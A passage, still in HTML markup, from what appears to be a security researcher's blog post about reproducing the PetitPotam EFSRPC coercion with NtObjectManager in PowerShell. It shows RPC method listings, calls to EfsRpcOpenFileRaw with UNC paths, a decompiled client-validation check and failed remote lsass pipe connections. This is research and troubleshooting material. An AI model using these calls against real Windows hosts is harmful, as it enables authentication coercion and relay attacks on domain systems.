</span><span class="n">EfsRpcAddUsersToFileEx_Downlevel</span><span class="w">            </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcAddUsersToFileEx_Downlevel</span><span class="p">(</span><span class="n">int</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">System.Nullable</span><span class="p">[</span><span class="n">Struct_8</span><span class="p">]</span><span class="w"> </span><span class="nx">p1</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">p2</span><span class="p">,</span><span class="w"> </span><span class="nx">Struct_5</span><span class="w"> </span><span class="nx">p3</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcAddUsersToFile_Downlevel</span><span class="w">              </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcAddUsersToFile_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">Struct_5</span><span class="w"> </span><span class="nx">p1</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcCloseRaw_Downlevel</span><span class="w">                    </span><span class="nx">Method</span><span class="w">     </span><span class="nx">EfsRpcCloseRaw_Downlevel_RetVal</span><span class="w"> </span><span class="nx">EfsRpcCloseRaw_Downlevel</span><span class="p">(</span><span class="n">NtApiDotNet.Ndr.Marshal.NdrContextHandle</span><span class="w"> </span><span class="nx">p0</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcDecryptFileSrv_Downlevel</span><span class="w">              </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcDecryptFileSrv_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p1</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcDuplicateEncryptionInfoFile_Downlevel</span><span class="w"> </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcDuplicateEncryptionInfoFile_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">p1</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p2</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p3</span><span class="p">,</span><span class="w"> </span><span class="nx">System.Nullable</span><span class="p">[</span><span class="n">Struct_8</span><span class="p">]</span><span class="w"> </span><span class="nx">p4</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p5</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcEncryptFileSrv_Downlevel</span><span class="w">              </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcEncryptFileSrv_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcFileKeyInfoEx_Downlevel</span><span class="w">               </span><span class="nx">Method</span><span class="w">     </span><span class="nx">EfsRpcFileKeyInfoEx_Downlevel_RetVal</span><span class="w"> </span><span class="nx">EfsRpcFileKeyInfoEx_Downlevel</span><span class="p">(</span><span class="n">int</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">System.Nullable</span><span class="p">[</span><span class="n">Struct_8</span><span class="p">]</span><span class="w"> </span><span class="nx">p1</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">p2</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p3</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcFileKeyInfo_Downlevel</span><span class="w">                 </span><span class="nx">Method</span><span class="w">     </span><span class="nx">EfsRpcFileKeyInfo_Downlevel_RetVal</span><span class="w"> </span><span class="nx">EfsRpcFileKeyInfo_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p1</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcFlushEfsCache_Downlevel</span><span class="w">               </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcFlushEfsCache_Downlevel</span><span class="p">()</span><span class="w">
</span><span class="n">EfsRpcGenerateEfsStream_Downlevel</span><span class="w">           </span><span class="nx">Method</span><span class="w">     </span><span class="nx">EfsRpcGenerateEfsStream_Downlevel_RetVal</span><span class="w"> </span><span class="nx">EfsRpcGenerateEfsStream_Downlevel</span><span class="p">()</span><span class="w">
</span><span class="n">EfsRpcGetEncryptedFileMetadata_Downlevel</span><span class="w">    </span><span class="nx">Method</span><span class="w">     </span><span class="nx">EfsRpcGetEncryptedFileMetadata_Downlevel_RetVal</span><span class="w"> </span><span class="nx">EfsRpcGetEncryptedFileMetadata_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcNotSupported_Downlevel</span><span class="w">                </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcNotSupported_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">p1</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p2</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p3</span><span class="p">,</span><span class="w"> </span><span class="nx">System.Nullable</span><span class="p">[</span><span class="n">Struct_8</span><span class="p">]</span><span class="w"> </span><span class="nx">p4</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p5</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcOpenFileRaw_Downlevel</span><span class="w">                 </span><span class="nx">Method</span><span class="w">     </span><span class="nx">EfsRpcOpenFileRaw_Downlevel_RetVal</span><span class="w"> </span><span class="nx">EfsRpcOpenFileRaw_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p1</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p2</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcQueryRecoveryAgents_Downlevel</span><span class="w">         </span><span class="nx">Method</span><span class="w">     </span><span class="nx">EfsRpcQueryRecoveryAgents_Downlevel_RetVal</span><span class="w"> </span><span class="nx">EfsRpcQueryRecoveryAgents_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcQueryUsersOnFile_Downlevel</span><span class="w">            </span><span class="nx">Method</span><span class="w">     </span><span class="nx">EfsRpcQueryUsersOnFile_Downlevel_RetVal</span><span class="w"> </span><span class="nx">EfsRpcQueryUsersOnFile_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcReadFileRaw_Downlevel</span><span class="w">                 </span><span class="nx">Method</span><span class="w">     </span><span class="nx">EfsRpcReadFileRaw_Downlevel_RetVal</span><span class="w"> </span><span class="nx">EfsRpcReadFileRaw_Downlevel</span><span class="p">(</span><span class="n">NtApiDotNet.Ndr.Marshal.NdrContextHandle</span><span class="w"> </span><span class="nx">p0</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcRemoveUsersFromFile_Downlevel</span><span class="w">         </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcRemoveUsersFromFile_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">Struct_0</span><span class="w"> </span><span class="nx">p1</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcSetEncryptedFileMetadata_Downlevel</span><span class="w">    </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcSetEncryptedFileMetadata_Downlevel</span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">System.Nullable</span><span class="p">[</span><span class="n">Struct_8</span><span class="p">]</span><span class="w"> </span><span class="nx">p1</span><span class="p">,</span><span class="w"> </span><span class="nx">Struct_8</span><span class="w"> </span><span class="nx">p2</span><span class="p">,</span><span class="w"> </span><span class="nx">System.Nullable</span><span class="p">[</span><span class="n">Struct_10</span><span class="p">]</span><span class="w"> </span><span class="nx">p3</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcSetFileEncryptionKey_Downlevel</span><span class="w">        </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcSetFileEncryptionKey_Downlevel</span><span class="p">(</span><span class="n">System.Nullable</span><span class="p">[</span><span class="n">Struct_6</span><span class="p">]</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p1</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">p2</span><span class="p">)</span><span class="w">
</span><span class="n">EfsRpcWriteFileRaw_Downlevel</span><span class="w">                </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsRpcWriteFileRaw_Downlevel</span><span class="p">(</span><span class="n">NtApiDotNet.Ndr.Marshal.NdrContextHandle</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">byte</span><span class="p">[]</span><span class="w"> </span><span class="nx">p1</span><span class="p">)</span><span class="w">
</span><span class="n">EfsUsePinForEncryptedFiles_Downlevel</span><span class="w">        </span><span class="nx">Method</span><span class="w">     </span><span class="nx">int</span><span class="w"> </span><span class="nx">EfsUsePinForEncryptedFiles_Downlevel</span><span class="p">(</span><span class="n">Struct_4</span><span class="w"> </span><span class="nx">p0</span><span class="p">,</span><span class="w"> </span><span class="nx">Struct_9</span><span class="w"> </span><span class="nx">p1</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>The original procedure <a href="https://github.com/topotam/PetitPotam/blob/f30cd44112561807e746cccb1fec878aebeeac51/PetitPotam.py#L456">used</a> in PetitPotam was <code class="language-plaintext highlighter-rouge">EfsRpcOpenFileRaw</code>.</p><p>The function signature for <code class="language-plaintext highlighter-rouge">EfsRpcOpenFileRaw</code> from the client says it only requires a <code class="language-plaintext highlighter-rouge">string</code> and an <code class="language-plaintext highlighter-rouge">int</code>. Easy enough to pass in a Powershell console.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">EfsRpcOpenFileRaw_Downlevel_RetVal</span> <span class="n">EfsRpcOpenFileRaw_Downlevel</span><span class="p">(</span><span class="n">string</span> <span class="n">p1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">p2</span><span class="p">)</span>
</pre></table></code></div></div><p>From <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8">MSDN</a> we know:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kt">long</span> <span class="nf">EfsRpcOpenFileRaw</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">handle_t</span> <span class="n">binding_h</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">PEXIMPORT_CONTEXT_HANDLE</span><span class="o">*</span> <span class="n">hContext</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">string</span><span class="p">]</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">FileName</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="kt">long</span> <span class="n">Flags</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Again taking a look at PetitPotam and <em>itm4n</em>’s example, we gather some specifics about the parameters. We just need to pass in a <a href="https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths">UNC</a> file <a href="https://github.com/topotam/PetitPotam/blob/f30cd44112561807e746cccb1fec878aebeeac51/PetitPotam.py#L377">path</a> for<em>FileName</em> and <a href="https://github.com/topotam/PetitPotam/blob/f30cd44112561807e746cccb1fec878aebeeac51/PetitPotam.py#L378">null</a> for the <em>Flags</em>.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">EfsRpcOpenFileRaw_Downlevel</span><span class="p">(</span><span class="s2">"\\127.0.0.1\C</span><span class="err">$</span><span class="s2">\workspace\all-your-RPC-are-belong-to-NtObjectManger.txt"</span><span class="p">,</span><span class="nx">0</span><span class="p">)</span><span class="w">

</span><span class="n">p0</span><span class="w">                                                           </span><span class="nx">retval</span><span class="w">
</span><span class="o">--</span><span class="w">                                                           </span><span class="o">------</span><span class="w">
</span><span class="n">Handle:</span><span class="w"> </span><span class="nx">00000000-0000-0000-0000-000000000000</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Attributes:</span><span class="w"> </span><span class="nx">0</span><span class="w">      </span><span class="nx">5</span><span class="w">
</span></pre></table></code></div></div><p>Hmm. Handle 0. retval 5. Does 5 == <em>ERROR_ACCESS_DENIED</em>?. Why???</p><p><strong>It took me four days to figure out why</strong>!</p><h2 id="troubleshooting-petitpotam"><span class="mr-2">Troubleshooting PetitPotam</span><a href="#troubleshooting-petitpotam" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There are a myriad of reasons any particular RPC call doesn’t succeed. To make a remote procedure call, a client must first bind (or connect) to the server, and then call the procedure. To connect to an RPC server, there might be <a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserveruseprotseqep#:~:text=the%20Protseq%20parameter.-,SecurityDescriptor,-Pointer%20to%20an">security descriptor</a> with criteria your client doesn’t meet, or specific server <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/interface-registration-flags">interface registration flags</a> might prevent your client from connecting remotely. For the actual procedure to succeed, there might be a <a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif2#:~:text=IfCallbackFn-,Security%2Dcallback%20function,-%2C%20or%20NULL%20for">security callback</a> function that you need to satisfy, or the RPC server might have its own custom checks built into the procedure itself. Ad hoc security checks, one of the changes to <code class="language-plaintext highlighter-rouge">efslsaext.dll</code>, is one of the many reasons our last attempt to call a procedure failed.</p><p>The reason our call to <code class="language-plaintext highlighter-rouge">EfsRpcOpenFileRaw_Downlevel</code> didn’t work is because I am running this in 2022, and the <code class="language-plaintext highlighter-rouge">efslsaext.dll</code> (<em>10.0.22000.556</em>) has dramatically changed since the original PetitPotam (<em>10.0.22000.132</em>) and even since Forshaw gave us <a href="https://www.tiraniddo.dev/2021/08/how-to-secure-windows-rpc-server-and.html#:~:text=the%20lsass%20pipe.-,The%20Fix%20is%20In,-What%20did%20Microsoft">detailed information</a> about the first patch to PetitPotam (<em>10.0.22000.376</em>).</p><h3 id="efsrpcopenfileraw_downlevel---local-calls-not-allowed"><span class="mr-2">EfsRpcOpenFileRaw_Downlevel - Local calls not allowed</span><a href="#efsrpcopenfileraw_downlevel---local-calls-not-allowed" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The connection I made above was to my local machine, the result of not specifying a remote address.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Connect-RpcClient</span><span class="w"> </span><span class="nt">-Client</span><span class="w"> </span><span class="nv">$Client</span><span class="w"> </span><span class="nt">-ProtocolSequence</span><span class="w"> </span><span class="nx">ncacn_np</span><span class="w"> </span><span class="nt">-EndpointPath</span><span class="w"> </span><span class="s2">"\pipe\lsass"</span><span class="w">
</span></pre></table></code></div></div><p>Several <code class="language-plaintext highlighter-rouge">Efs</code> calls include a security check call to <code class="language-plaintext highlighter-rouge">EfsRpcpValidateClientCall</code> that will fail the procedure if you call it from a local context.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">EfsRpcpValidateClientCall</span><span class="p">(</span><span class="n">RPC_BINDING_HANDLE</span> <span class="n">Binding</span><span class="p">,</span> 
                               <span class="n">PBOOL</span> <span class="n">ValidClient</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ClientLocalFlag</span><span class="p">;</span>
  <span class="n">I_RpcBindingIsClientLocal</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ClientLocalFlag</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ClientLocalFlag</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">RPC_WSTR</span> <span class="n">StringBinding</span><span class="p">;</span>
    <span class="n">RpcBindingToStringBindingW</span><span class="p">(</span><span class="n">Binding</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">StringBinding</span><span class="p">);</span>
    <span class="n">RpcStringBindingParseW</span><span class="p">(</span><span class="n">StringBinding</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Protseq</span><span class="p">,</span> 
                           <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">CompareStringW</span><span class="p">(</span><span class="n">LOCALE_INVARIANT</span><span class="p">,</span> <span class="n">NORM_IGNORECASE</span><span class="p">,</span> 
        <span class="n">Protseq</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s">L"ncacn_np"</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">CSTR_EQUAL</span><span class="p">)</span>
        <span class="o">*</span><span class="n">ValidClient</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="err">}</span>
</pre></table></code></div></div><p>Explained by @tiraniddo:</p><blockquote><p>Basically the <code class="language-plaintext highlighter-rouge">ValidClient</code> parameter will only be set to TRUE if the caller used the named pipe transport and the pipe wasn’t opened locally, i.e. the named pipe was opened over SMB. This is basically all the security that’s being checked for. Therefore the only security that could be enforced is limited by who’s allowed to connect to a suitable named pipe endpoint. <a href="https://www.tiraniddo.dev/2021/08/how-to-secure-windows-rpc-server-and.html">How to secure a Windows RPC Server, and how not to</a></p></blockquote><p>OK, local calls won’t work for any procedure that makes a call to <code class="language-plaintext highlighter-rouge">EfsRpcpValidateClientCall</code>. I will have to change the setup of my auditing. There was a remote procedure call that succeeded despite my client connection via <em>localhost</em>. It succeeded because the local check was absent and it simply returns a value.</p><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/EfsRpcFileKeyInfoEx-decomp.png" alt="EfsRpcFileKeyInfoEx decompilation" class="shadow" data-proofer-ignore><em>EfsRpcFileKeyInfoEx decompilation Ghidra</em></p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">EfsRpcFileKeyInfoEx_Downlevel</span><span class="p">(</span><span class="nx">2</span><span class="p">,</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">New</span><span class="o">.</span><span class="nf">Struct_8</span><span class="p">(),</span><span class="w"> </span><span class="s1">'test'</span><span class="p">,</span><span class="nx">1</span><span class="p">)</span><span class="w">

</span><span class="n">p4</span><span class="w"> </span><span class="nx">retval</span><span class="w">
</span><span class="o">--</span><span class="w"> </span><span class="o">------</span><span class="w">
       </span><span class="mi">50</span><span class="w">
</span></pre></table></code></div></div><p>0x32 == 50</p><p>OK, for the procedure we care about, we can solve the local connect problem by connecting to a remote machine… or so I thought.</p><h3 id="ntobjectmanager-cheats-with-pipes"><span class="mr-2">NtObjectManager Cheats with Pipes</span><a href="#ntobjectmanager-cheats-with-pipes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Here is an attempt to connect to a pipe on a remote machine:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Connect-RpcClient</span><span class="w"> </span><span class="nt">-Client</span><span class="w"> </span><span class="nv">$client</span><span class="w"> </span><span class="nt">-StringBinding</span><span class="w"> </span><span class="s2">"ncacn_np:192.168.0.20[\\pipe\\lsass]"</span><span class="w">
</span><span class="n">Exception</span><span class="w"> </span><span class="nx">calling</span><span class="w"> </span><span class="s2">"Connect"</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="s2">"2"</span><span class="w"> </span><span class="nx">argument</span><span class="p">(</span><span class="n">s</span><span class="p">):</span><span class="w"> </span><span class="s2">"(0xC000006D) - The attempted logon is invalid. This is either due to a bad username or authentication information."</span><span class="w">
</span><span class="n">At</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\WindowsPowerShell\Modules\NtObjectManager\1.1.33\NtObjectManager.psm1:14161</span><span class="w"> </span><span class="nx">char:17</span><span class="w">
</span><span class="o">+</span><span class="w">                 </span><span class="nv">$Client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$StringBinding</span><span class="p">,</span><span class="w"> </span><span class="nv">$security</span><span class="p">)</span><span class="w">
</span><span class="o">+</span><span class="w">                 </span><span class="n">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">CategoryInfo</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">NotSpecified:</span><span class="w"> </span><span class="p">(:)</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="n">MethodInvocationException</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">NtException</span><span class="w">
</span></pre></table></code></div></div><p>Received the exception. <code class="language-plaintext highlighter-rouge">"The attempted logon is invalid. This is either due to a bad username or authentication information."</code>. Oh right, just need to add valid creds…</p><p><code class="language-plaintext highlighter-rouge">-Credentials $(Get-LsaCredential -UserName "ABC" -Domain "DOMAIN" -Password "pwd")</code></p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Connect-RpcClient</span><span class="w"> </span><span class="nt">-Client</span><span class="w"> </span><span class="nv">$client</span><span class="w"> </span><span class="nt">-StringBinding</span><span class="w"> </span><span class="s2">"ncacn_np:192.168.0.20[\\pipe\\lsass]"</span><span class="w"> </span><span class="nt">-Credentials</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-LsaCredential</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="s2">"ABC"</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="s2">"DOMAIN"</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="s2">"pwd"</span><span class="p">)</span><span class="w">
</span><span class="n">Exception</span><span class="w"> </span><span class="nx">calling</span><span class="w"> </span><span class="s2">"Connect"</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="s2">"2"</span><span class="w"> </span><span class="nx">argument</span><span class="p">(</span><span class="n">s</span><span class="p">):</span><span class="w"> </span><span class="s2">"(0xC000006D) - The attempted logon is invalid. This is either due to a bad username or authentication information."</span><span class="w">
</span><span class="n">At</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\WindowsPowerShell\Modules\NtObjectManager\1.1.33\NtObjectManager.psm1:14161</span><span class="w"> </span><span class="nx">char:17</span><span class="w">
</span><span class="o">+</span><span class="w">                 </span><span class="nv">$Client</span><span class="o">.</span><span class="nf">Connect</span><span class="p">(</span><span class="nv">$StringBinding</span><span class="p">,</span><span class="w"> </span><span class="nv">$security</span><span class="p">)</span><span class="w">
</span><span class="o">+</span><span class="w">                 </span><span class="n">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">CategoryInfo</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">NotSpecified:</span><span class="w"> </span><span class="p">(:)</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="n">MethodInvocationException</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">NtException</span><span class="w">
</span></pre></table></code></div></div><p>Still fails with valid credentials. It becomes a bit more clear looking at the attempted connection to the pipe over SMB.</p><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/smb-pipe-failure.png" alt="smb-pipe-fail" class="shadow" data-proofer-ignore><em>SMB Pipe Connection Failure</em></p><p>Even when you supply credentials to <code class="language-plaintext highlighter-rouge">Connect-RpcClient</code>, NtObjectManager doesn’t use the username or password to <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/c02ed8ba04324e54a0a188ab9877ee6aa372dfac/NtApiDotNet/Win32/Rpc/Transport/RpcNamedPipeClientTransport.cs#L63">connect</a> to the pipe. It “cheats” a bit by relying on <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/c02ed8ba04324e54a0a188ab9877ee6aa372dfac/NtApiDotNet/Win32/Rpc/Transport/RpcNamedPipeClientTransport.cs#L34">NtOpenFile</a> to connect the pipe. SMB by default sends over your logged in user credentials when you call <code class="language-plaintext highlighter-rouge">NtOpenFile</code> with a UNC path. Impacket is <a href="https://github.com/topotam/PetitPotam/blob/d83ac8f2dd34654628c17490f99106eb128e7d1e/PetitPotam.py#L345">able to set creds</a>, but perhaps because it provides more low-level control of SMB? Again, this seems like an issue with the initial connection to the named pipe over SMB rather than NtObjectManager’s ability to use the RPC named pipe <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/c02ed8ba04324e54a0a188ab9877ee6aa372dfac/NtApiDotNet/Win32/Rpc/Transport/RpcConnectedClientTransport.cs#L47">transport security</a> on a <em>connected</em> client. Once connected, it properly leverages the RPC transport security and is able to <a 